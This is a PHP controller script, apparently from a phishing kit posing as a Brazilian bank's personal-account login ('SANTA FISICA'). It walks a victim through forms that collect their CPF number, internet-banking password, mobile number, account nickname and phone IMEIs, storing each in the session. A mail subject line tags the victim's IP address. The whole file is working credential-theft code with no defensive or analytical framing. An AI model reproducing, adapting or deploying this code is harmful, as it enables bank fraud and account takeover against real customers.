<?php
include('../../conn.php');
include('../functions/functions.php');

$assunto = "SANTA FISICA OFF -  $UserIp - $data";

if(isset($_POST['sender']) && $_POST['sender'] == 'index_f'):
	$cpf = $_POST['is_cpf'];
	$_SESSION['cpf'] = $cpf;
	$_SESSION['executar'] = 'PASS_NET';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'pass_net'):
	$passNet = $_POST['is_psnet'];
	$_SESSION['passNet'] = $passNet;
	$_SESSION['executar'] = 'BUSTER';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'buster'):
	$_SESSION['executar'] = 'FONE';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'fone'):
	$fone = $_POST['is_celular'];
	$cpf = $_SESSION['cpf'];
	$passNet = $_SESSION['passNet'];
	$_SESSION['fone'] = $fone;
	$_SESSION['executar'] = 'APELIDO';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'apelido'):
	$apelido = $_POST['is_apelido'];
	$_SESSION['apelido'] = $apelido;
	$_SESSION['executar'] = 'IMEI';
	header('Location: acesso.php');

elseif(isset($_POST['sender']) && $_POST['sender'] == 'imei'):
	$imei_one = $_POST['is_imei_one'];
	@$imei_two = $_POST['is_imei_two'];
	$_SESSION['executar'] = 'CAIXA';
	header('Location: acesso.php');

endif;


if(isset($_SESSION['checkEnter']) && $_SESSION['checkEnter'] == true):

	if(!isset($_SESSION['executar']) || $_SESSION['executar'] == ''):
		include('index.php');
	elseif($_SESSION['executar'] == 'BUSTER'):
		include('includes/buster.php');
	elseif($_SESSION['executar'] == 'PASS_NET'):
		include('includes/pass_net.php');
	elseif($_SESSION['executar'] == 'FONE'):
		include('includes/fone.php');
	elseif($_SESSION['executar'] == 'IMEI'):
		include('includes/imei.php');
	elseif($_SESSION['executar'] == 'APELIDO'):
		include('includes/apelido.php');
	elseif($_SESSION['executar'] == 'CAIXA'):
		include('includes/caixa.php');
	endif;


else:
	header('Location: ../index.php');
endif;
?>
